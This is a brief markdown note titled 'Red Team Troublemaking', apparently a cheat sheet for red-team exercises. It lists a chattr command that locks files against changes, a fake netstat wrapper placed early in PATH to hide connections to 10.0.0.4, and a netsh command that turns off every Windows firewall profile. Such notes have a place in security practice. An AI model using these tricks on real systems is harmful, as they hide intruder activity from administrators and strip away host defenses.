---
title: "Red Team Troublemaking"
date: 2021-10-09T15:27:23-05:00
draft: false
---

## Linux
* Locking out file changes - `chattr +i [filename]`
* Knock out an IP address in netstat - cat this to a netstat file early in the PATH, and remember to `chmod +x` it

```
#!/bin/sh
/bin/netstat $* | grep -v 10.0.0.4
```

## Windows
* Disable firewall - "netsh advfirewall set allprofiles state off"
